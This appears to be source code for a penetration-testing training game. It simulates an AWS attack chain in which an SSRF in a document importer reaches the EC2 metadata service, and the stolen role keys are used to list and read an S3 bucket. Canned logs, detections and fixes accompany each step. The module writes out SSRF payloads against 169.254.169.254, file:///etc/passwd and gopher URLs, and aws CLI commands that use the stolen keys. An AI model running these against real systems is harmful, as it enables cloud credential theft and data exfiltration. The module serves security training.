// Simulated engagement #5: the AWS / CLOUD phase of the Halcyon Mutual assessment. The path behind the 2019
// Capital One breach and many since: a web feature that fetches a URL for you (SSRF) is pointed at the EC2
// instance metadata service, which hands back the temporary keys of the instance's IAM role. Those keys work
// from anywhere, so you use them from your own machine, list the S3 bucket the role can read, and pull the
// one proof file the client planted.
//
// Everything is fiction and canned, exactly like the other engagements. Hosts are *.example (RFC 2606), every
// address is an RFC 5737 documentation IP (plus the fixed link-local metadata address every EC2 instance has),
// the AWS account is the documentation account 111122223333, commands are a fixed whitelist mapping to
// pre-written output, and nothing is sent or executed. The SIEM is the real AWS stack: CloudTrail records
// (management + S3 data events), GuardDuty findings, and the app's nginx / import log. logs(b, t, ctx) writes
// each move's trace keyed to the step so the SOC debrief can grade which line it was.
import { AWS_UA, s3Resources, remoteIp } from '../game/cloudfmt.js';

export const CLOUD_FLAG = 'FLAG{imdsv1-handed-over-the-keys}';
export const CLOUD_ATTACKER = { ip: '198.51.100.61', host: 'assessor' };
// The vulnerable app: the claims-document importer on one EC2 instance, with an IAM role attached.
const APP = { name: 'docs.halcyon.example', host: 'docs01', ip: '203.0.113.20', instance: 'i-0c2d4e6f8a1b3c5d7', priv: '192.0.2.41' };
const ROLE = 'claims-docs-role';
const BUCKET = 'halcyon-claims-docs';
const IMDS = '169.254.169.254'; // the instance metadata service, same link-local address on every EC2 instance
const STOLEN_KEY = 'ASIAHALCYONDOCSROLE1';
const ATK_GEO = { country: 'Netherlands', city: 'Amsterdam', org: 'AS-EXAMPLE-VPS', asn: '64500', lat: 52.37, lon: 4.9 };
// A Wednesday-afternoon window, the cloud phase of the engagement.
export const CLOUD_DATE = { weekday: 'WED', name: 'Wednesday', month: 'Oct', day: 28, year: 2026, domain: 'halcyon.example', netbios: 'HALCYON' };

const pad = (n) => String(n).padStart(2, '0');
const clock = (t) => `${pad(Math.floor(t / 3600))}:${pad(Math.floor((t % 3600) / 60))}:${pad(t % 60)}`;
const webStamp = (t) => `[${CLOUD_DATE.day}/${CLOUD_DATE.month}/${CLOUD_DATE.year}:${clock(t)} -0400]`;
const UA_ATK = 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0';
const UA_FFUF = 'ffuf/2.1.0 (authorised assessment)';
const UA_CUST = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1'];

/** nginx access_combined line on the document importer. */
function nginx(b, t, ip, method, path, status, bytes, ua, extra = {}) {
  const raw = `${ip} - - ${webStamp(t)} "${method} ${path} HTTP/1.1" ${status} ${bytes} "-" "${ua}"`;
  return b.add(t, APP.host, 'nginx', `nginx: ${raw}`, { ip, access: raw, ...extra });
}
/** The importer's own log: every outbound fetch it makes on a user's behalf. */
function importLog(b, t, url, status, bytes, extra = {}) {
  return b.add(t, APP.host, 'docs-import', `docs-import INFO fetch url=${url} status=${status} bytes=${bytes} worker=${APP.instance}`, extra);
}
const imp = (url) => `/api/import?url=${url}`;
// The stolen role session as CloudTrail sees it: an assumed-role key, used from outside AWS.
const STOLEN = { type: 'AssumedRole', role: ROLE, name: ROLE, session: APP.instance, accessKey: STOLEN_KEY, ec2: true };

export const CLOUD_ENGAGEMENT = {
  id: 'halcyon-cloud-2026',
  name: 'AWS cloud (SSRF → S3)',
  client: 'Halcyon Mutual',
  title: 'Cloud pentest: from a URL field to the claims bucket in AWS',
  blurb: 'Break into AWS the way the 2019 Capital One breach did: find a feature that fetches any URL for you (SSRF), point it at the EC2 metadata service to steal the server’s IAM role keys, use those keys from your own machine, list the S3 bucket, and read the proof file. 5 moves, web bug → cloud data.',
  seed: 6118,
  date: CLOUD_DATE,
  attacker: CLOUD_ATTACKER,
  prompt: `${CLOUD_ATTACKER.host}@kali:~/halcyon-cloud$`,
  flag: CLOUD_FLAG,
  noise: cloudEngagementNoise,
  summary: 'The one-line report: the document importer fetched any URL it was given (SSRF, OWASP A10), so it could be pointed at the EC2 instance metadata service, which still allowed IMDSv1 and handed back the temporary keys of the instance’s IAM role. Those keys worked from outside AWS and the role could list and read the whole claims-documents bucket. Four fixes break the chain: enforce IMDSv2 (a token the SSRF can’t fetch), allow-list the importer’s destinations and block link-local addresses, scope the role to the one prefix it needs, and alert on GuardDuty’s InstanceCredentialExfiltration finding — which fired the moment the keys were used.',
  start: 14 * 3600 + 6 * 60, // 14:06, inside the agreed window
  roe: [
    'Authorised by Halcyon Mutual’s CISO as the cloud phase, Wednesday Oct 28, 13:00–17:00. Simulated AWS account 111122223333 only.',
    'In scope: docs.halcyon.example (the claims-document importer) and any AWS access gained through it, read-only.',
    'Objective: prove cloud data access by reading s3://halcyon-claims-docs/engagement-proof.txt, the file the CISO planted. Nothing else.',
    'Out of scope: downloading or copying real claims documents, changing any AWS resource (users, keys, policies, instances), or disabling logging.',
    'Stealth counts: CloudTrail and GuardDuty watch the account and the importer logs every fetch. Loud moves (fuzzing, brute-forcing permissions) show up as alerts in the debrief.',
  ],
  steps: [
    {
      id: 'ssrf',
      tactic: 'Initial Access',
      tid: 'T1190',
      tname: 'Exploit Public-Facing Application',
      goal: 'Prove the "import a document by URL" feature will fetch any address you give it (SSRF).',
      defend: 'Allow-list the hosts the importer may fetch from and refuse private and link-local addresses (OWASP A10: SSRF); alert when the importer fetches anything off the list.',
      choices: [
        {
          cmd: 'curl -s "https://docs.halcyon.example/api/import?url=http://198.51.100.61/canary.pdf"',
          label: 'Point the importer at your own listener, once (quiet)',
          output: [
            '{"status":"imported","stored":"s3://halcyon-claims-docs/imports/canary.pdf","bytes":2048}',
            '[listener 198.51.100.61:80] GET /canary.pdf from 203.0.113.20  User-Agent: python-requests/2.31',
            '# The server fetched a URL you chose: that is server-side request forgery (SSRF).',
            '# Two more clues: it runs in AWS, and it saves files to the S3 bucket halcyon-claims-docs.',
          ],
        },
        {
          cmd: 'ffuf -u "https://docs.halcyon.example/api/import?url=FUZZ" -w ssrf-payloads.txt',
          label: 'Fuzz the url parameter with 300 SSRF payloads (loud)',
          loud: true,
          output: [
            'ffuf 2.1.0 :: 300 payloads :: url parameter',
            '[Status: 200] http://198.51.100.61/canary.pdf',
            '[Status: 200] http://192.0.2.1/',
            '[Status: 500] file:///etc/passwd   (scheme refused)',
            '[Status: 429] ... rate limited after 180 requests',
            '# The importer fetches internal addresses too. 300 odd URLs in a minute also lit up the WAF (see the debrief).',
          ],
        },
      ],
      logs(b, t, { loud }) {
        nginx(b, t, CLOUD_ATTACKER.ip, 'GET', imp('http://198.51.100.61/canary.pdf'), 200, 88, loud ? UA_FFUF : UA_ATK, { key: 'ssrf', attack: 'T1190' });
        importLog(b, t + 1, 'http://198.51.100.61/canary.pdf', 200, 2048, { key: 'ssrf', attack: 'T1190' });
        if (loud) {
          ['http://192.0.2.1/', 'file:///etc/passwd', 'http://192.0.2.30:5432/', 'gopher://192.0.2.5:25/'].forEach((u, i) =>
            nginx(b, t + 3 + i, CLOUD_ATTACKER.ip, 'GET', imp(u), i === 1 ? 500 : 200, 61, UA_FFUF, { key: 'ssrf', attack: 'T1190' }));
          b.add(t + 40, 'waf01', 'waf', `ModSecurity: Warning. Possible SSRF: URL with private/internal address in parameter [id "934110"] [client ${CLOUD_ATTACKER.ip}] [uri "/api/import"] [host "${APP.name}"]`,
            { ip: CLOUD_ATTACKER.ip, key: 'ssrf', attack: 'T1190', detection: 'WAF (CRS 934110): SSRF payloads in the url parameter of /api/import — 300 in a minute from one address' });
        }
      },
    },
    {
      id: 'imds',
      tactic: 'Credential Access',
      tid: 'T1552.005',
      tname: 'Unsecured Credentials: Cloud Instance Metadata API',
      goal: 'Turn the SSRF on the EC2 metadata service and read the instance role’s temporary AWS keys.',
      defend: 'Require IMDSv2 on every instance (HttpTokens=required): it needs a PUT for a session token first, which a GET-only SSRF cannot do. Set the hop limit to 1 for containers.',
      choices: [
        {
          cmd: 'curl -s "https://docs.halcyon.example/api/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
          label: 'Ask the metadata service for the role and its keys (quiet: 2 requests)',
          output: [
            'claims-docs-role',
            '# IMDSv1 answered a plain GET: no token needed. Now ask for that role by name:',
            '$ curl -s ".../api/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/claims-docs-role"',
            '{',
            '  "Code" : "Success",',
            '  "Type" : "AWS-HMAC",',
            '  "AccessKeyId" : "ASIAHALCYONDOCSROLE1",',
            '  "SecretAccessKey" : "(redacted in this simulation)",',
            '  "Token" : "(session token, redacted)",',
            '  "Expiration" : "2026-10-28T20:14:09Z"',
            '}',
            '# Temporary keys for the instance’s IAM role. They work from anywhere until they expire.',
          ],
        },
        {
          cmd: 'ffuf -u "https://docs.halcyon.example/api/import?url=http://169.254.169.254/latest/meta-data/FUZZ" -w imds-paths.txt',
          label: 'Walk the whole metadata tree with a wordlist (loud)',
          loud: true,
          output: [
            'ffuf 2.1.0 :: 64 metadata paths',
            '[Status: 200] ami-id, hostname, instance-id, local-ipv4, placement/region, user-data, ...',
            '[Status: 200] iam/security-credentials/claims-docs-role   -> AccessKeyId ASIAHALCYONDOCSROLE1 (+ secret, token)',
            '# Same keys, but 64 metadata fetches in seconds is an anomaly the importer log makes obvious.',
          ],
        },
      ],
      logs(b, t, { loud }) {
        const base = `http://${IMDS}/latest/meta-data/iam/security-credentials/`;
        nginx(b, t, CLOUD_ATTACKER.ip, 'GET', imp(base), 200, 17, loud ? UA_FFUF : UA_ATK, { key: 'imds', attack: 'T1552.005' });
        importLog(b, t, base, 200, 17, { key: 'imds', attack: 'T1552.005' });
        nginx(b, t + 6, CLOUD_ATTACKER.ip, 'GET', imp(base + ROLE), 200, 1320, loud ? UA_FFUF : UA_ATK, { key: 'imds', attack: 'T1552.005' });
        importLog(b, t + 6, base + ROLE, 200, 1320, { key: 'imds', attack: 'T1552.005' });
        if (loud) {
          ['ami-id', 'hostname', 'local-ipv4', 'placement/region', 'user-data'].forEach((p, i) =>
            importLog(b, t + 1 + i, `http://${IMDS}/latest/meta-data/${p}`, 200, 40 + i * 9,
              { key: 'imds', attack: 'T1552.005', detection: i === 0 ? 'App: the document importer fetched 64 instance-metadata URLs (169.254.169.254) in 10 seconds' : undefined }));
        }
      },
    },
    {
      id: 'usekeys',
      tactic: 'Initial Access',
      tid: 'T1078.004',
      tname: 'Valid Accounts: Cloud Accounts',
      goal: 'Load the stolen keys on your own machine and check who AWS thinks you are.',
      defend: 'Turn on GuardDuty and act on InstanceCredentialExfiltration findings; for sensitive roles, a policy condition (aws:SourceVpc / aws:EC2InstanceSourceVPC) makes instance keys useless outside the VPC.',
      choices: [
        {
          cmd: 'aws sts get-caller-identity --profile halcyon-stolen',
          label: 'Ask AWS who these keys belong to',
          prompt: `${CLOUD_ATTACKER.host}@kali:~/halcyon-cloud$ [${ROLE}]`,
          output: [
            '{',
            '    "UserId": "AROAHALCYONDOCSROLE:i-0c2d4e6f8a1b3c5d7",',
            '    "Account": "111122223333",',
            '    "Arn": "arn:aws:sts::111122223333:assumed-role/claims-docs-role/i-0c2d4e6f8a1b3c5d7"',
            '}',
            '# You are the server now, from your own laptop. No password, no MFA: just the role keys.',
            '# This API call can’t be denied, so it is the first thing every attacker runs. GuardDuty knows that too (see the debrief).',
          ],
        },
      ],
      logs(b, t) {
        b.aws(t, { name: 'GetCallerIdentity', id: STOLEN, ip: CLOUD_ATTACKER.ip, ua: AWS_UA.cli2('sts.get-caller-identity') }, { key: 'usekeys', attack: 'T1078.004' });
        b.guardduty(t + 300, {
          type: 'UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS',
          severity: 8,
          title: `Credentials for the EC2 instance role ${ROLE} were used from a remote AWS account or IP.`,
          description: `Credentials created exclusively for instance ${APP.instance} through an instance launch role are being used from external IP address ${CLOUD_ATTACKER.ip}.`,
          resource: { resourceType: 'AccessKey', accessKeyDetails: { accessKeyId: STOLEN_KEY, principalId: `AROAHALCYONDOCSROLE:${APP.instance}`, userType: 'AssumedRole', userName: ROLE } },
          action: { actionType: 'AWS_API_CALL', awsApiCallAction: { api: 'GetCallerIdentity', serviceName: 'sts.amazonaws.com', callerType: 'Remote IP', remoteIpDetails: remoteIp(CLOUD_ATTACKER.ip, ATK_GEO), affectedResources: {} } },
        }, { key: 'usekeys', attack: 'T1078.004', detection: `GuardDuty (severity 8): InstanceCredentialExfiltration.OutsideAWS — ${ROLE} keys used from ${CLOUD_ATTACKER.ip}, outside AWS` });
      },
    },
    {
      id: 'discover',
      tactic: 'Discovery',
      tid: 'T1619',
      tname: 'Cloud Storage Object Discovery',
      goal: 'See what the role can reach: list the bucket the importer writes to.',
      defend: 'Least privilege: the importer only needs s3:PutObject on imports/, not ListBucket and GetObject on the whole bucket. Alert on AccessDenied bursts from one principal.',
      choices: [
        {
          cmd: 'aws s3 ls s3://halcyon-claims-docs/ --profile halcyon-stolen',
          label: 'List only the bucket you already know about (quiet)',
          output: [
            '                           PRE claims/',
            '                           PRE imports/',
            '2026-10-28 09:02:11         96 engagement-proof.txt',
            '# The role can list the whole bucket, not just imports/. claims/ holds ~41,000 customer files.',
            '# engagement-proof.txt is the file the CISO planted. That is your target, and only that.',
          ],
        },
        {
          cmd: 'enumerate-iam --profile halcyon-stolen',
          label: 'Brute-force which of 1,000+ AWS APIs the keys may call (loud)',
          loud: true,
          output: [
            'enumerate-iam :: trying 1,071 read-only API calls with the stolen keys...',
            '[-] iam.list_users          AccessDenied',
            '[-] ec2.describe_instances  AccessDenied',
            '[-] secretsmanager.list_secrets  AccessDenied',
            '[+] s3.list_buckets         OK  -> halcyon-claims-docs',
            '[+] s3.list_objects_v2      OK  -> claims/  imports/  engagement-proof.txt',
            '# You learned the same thing, plus 1,000 AccessDenied errors in CloudTrail. GuardDuty flags that burst.',
          ],
        },
      ],
      logs(b, t, { loud }) {
        if (loud) {
          ['ListUsers', 'DescribeInstances', 'ListSecrets', 'GetAccountAuthorizationDetails', 'ListFunctions20150331'].forEach((name, i) =>
            b.aws(t + i, { name, id: STOLEN, ip: CLOUD_ATTACKER.ip, ua: AWS_UA.boto3, error: 'AccessDenied' }, { key: 'discover', attack: 'T1619' }));
          b.aws(t + 6, { name: 'ListBuckets', id: STOLEN, ip: CLOUD_ATTACKER.ip, ua: AWS_UA.boto3 }, { key: 'discover', attack: 'T1619' });
          b.guardduty(t + 420, {
            type: 'Discovery:IAMUser/AnomalousBehavior',
            severity: 5,
            title: `The role ${ROLE} invoked APIs commonly used in discovery tactics.`,
            description: `APIs commonly used to discover resources (ListUsers, DescribeInstances, ListSecrets and 1,000+ others) were invoked by ${ROLE} from ${CLOUD_ATTACKER.ip}, most of them denied.`,
            resource: { resourceType: 'AccessKey', accessKeyDetails: { accessKeyId: STOLEN_KEY, userType: 'AssumedRole', userName: ROLE } },
            action: { actionType: 'AWS_API_CALL', awsApiCallAction: { api: 'ListUsers', serviceName: 'iam.amazonaws.com', callerType: 'Remote IP', remoteIpDetails: remoteIp(CLOUD_ATTACKER.ip, ATK_GEO), affectedResources: {} } },
          }, { key: 'discover', attack: 'T1619', detection: `GuardDuty: Discovery:IAMUser/AnomalousBehavior — 1,000+ discovery API calls (mostly AccessDenied) by ${ROLE}` });
        }
        b.aws(t + 8, { name: 'ListObjects', id: STOLEN, ip: CLOUD_ATTACKER.ip, ua: loud ? AWS_UA.boto3 : AWS_UA.cli2('s3.ls'), data: true, bucket: BUCKET, params: { bucketName: BUCKET, Host: `${BUCKET}.s3.us-east-1.amazonaws.com`, delimiter: '/', prefix: '' }, resources: s3Resources(BUCKET) },
          { key: 'discover', attack: 'T1619' });
      },
    },
    {
      id: 'collect',
      tactic: 'Collection',
      tid: 'T1530',
      tname: 'Data from Cloud Storage',
      goal: 'Prove data access the way the rules allow: read the one planted proof file. Nothing else.',
      defend: 'S3 data-event logging on sensitive buckets, GuardDuty S3 Protection for unusual readers, and a bucket policy that only lets the importer write to imports/ from inside the VPC.',
      objective: true,
      choices: [
        {
          cmd: 'aws s3 cp s3://halcyon-claims-docs/engagement-proof.txt - --profile halcyon-stolen',
          label: 'Print the planted proof file to your screen',
          output: [
            'ENGAGEMENT PROOF — Halcyon Mutual cloud phase.',
            'If you can read this from outside AWS, the importer’s role keys got out.',
            `Proof token: ${CLOUD_FLAG}`,
            '# Cloud data access proven. Objective reached — stop here and write it up.',
          ],
        },
        {
          cmd: 'aws s3 sync s3://halcyon-claims-docs/ ./loot --profile halcyon-stolen',
          label: 'Download the whole bucket, 41,000 claims files',
          violation: true,
          output: [
            'STOPPED by the rules of engagement.',
            'That bucket holds real customers’ claim documents: names, addresses, medical bills. Copying it is',
            'exactly what made Capital One a breach of 100 million people. You already proved access by listing it.',
            'Prove access, never take the data. Strike recorded.',
          ],
        },
      ],
      logs(b, t) {
        b.aws(t, { name: 'GetObject', id: STOLEN, ip: CLOUD_ATTACKER.ip, ua: AWS_UA.cli2('s3.cp'), data: true, bucket: BUCKET, params: { bucketName: BUCKET, Host: `${BUCKET}.s3.us-east-1.amazonaws.com`, key: 'engagement-proof.txt' }, resources: s3Resources(BUCKET, 'engagement-proof.txt'), additional: { bytesTransferredIn: 0, bytesTransferredOut: 96, AuthenticationMethod: 'AuthHeader', SignatureVersion: 'SigV4' } },
          { key: 'collect', attack: 'T1530' });
      },
    },
  ],
};

/** An ordinary Wednesday afternoon: customers uploading documents, the importer writing to S3 from inside AWS,
 *  and staff / CI activity in CloudTrail, so the attack hides in a haystack of the same event types. */
export function cloudEngagementNoise(b, start, end) {
  const { r } = b;
  const j = (n) => Math.floor(r() * n);
  for (let t = start - 700; t < end; t += 15 + j(45)) {
    const ip = `203.0.113.${100 + j(80)}`;
    const doc = `https://files.partner-clinic.example/bills/${1000 + j(9000)}.pdf`;
    nginx(b, t, ip, 'GET', imp(doc), 200, 88, UA_CUST[j(2)], { noise: true });
    importLog(b, t + 1, doc, 200, 40000 + j(900000), { noise: true });
  }
  for (let t = start - 600; t < end; t += 30 + j(70)) {
    const key = `imports/${1000 + j(9000)}.pdf`;
    b.aws(t, { name: 'PutObject', id: { ...STOLEN, accessKey: 'ASIAHALCYONDOCSROLE0' }, ip: APP.priv, ua: AWS_UA.boto3, data: true, bucket: BUCKET, params: { bucketName: BUCKET, Host: `${BUCKET}.s3.us-east-1.amazonaws.com`, key }, resources: s3Resources(BUCKET, key) }, { noise: true });
  }
  for (let t = start - 500; t < end; t += 120 + j(240)) {
    const roll = r();
    if (roll < 0.5) b.aws(t, { name: ['GetAuthorizationToken', 'DescribeServices', 'PutObject'][j(3)], id: { type: 'IAMUser', name: 'ci-deploy' }, ip: '192.0.2.50', ua: AWS_UA.boto3 }, { noise: true });
    else if (roll < 0.8) b.aws(t, { name: ['DescribeInstances', 'ListBuckets', 'GetBucketPolicy'][j(3)], id: { type: 'AssumedRole', role: 'HalcyonAdmins', name: 'HalcyonAdmins', session: 'dana.k', mfa: true }, ip: '192.0.2.25', ua: AWS_UA.console }, { noise: true });
    else b.aws(t, { name: 'GetCallerIdentity', id: { type: 'AssumedRole', role: 'monitoring-readonly', name: 'monitoring-readonly', session: 'cloudwatch-agent' }, ip: '192.0.2.60', ua: AWS_UA.boto3 }, { noise: true });
  }
}
